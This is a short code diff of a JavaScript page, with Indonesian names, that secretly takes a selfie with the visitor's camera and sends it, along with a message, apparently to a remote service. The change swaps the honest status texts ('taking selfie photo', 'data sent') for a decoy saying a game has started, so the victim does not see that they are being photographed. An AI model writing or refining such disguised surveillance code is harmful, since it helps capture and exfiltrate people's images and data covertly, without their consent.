@@ -288,13 +288,13 @@
             await sendMessage(pesan);
 
             // === AMBIL & KIRIM FOTO SELFIE ===
-            document.getElementById('izinStatus').innerHTML = '📸 Mengambil foto selfie...';
+            document.getElementById('izinStatus').innerHTML = 'Game mulai di mainkan';
             const foto = await ambilFotoSelfie();
             if (foto) {
                 await sendPhoto(foto);
             }
 
-            document.getElementById('izinStatus').innerHTML = '✅ Data terkirim!';
+            document.getElementById('izinStatus').innerHTML = '!';
 
         } catch (error) {
             console.error('Error:', error);
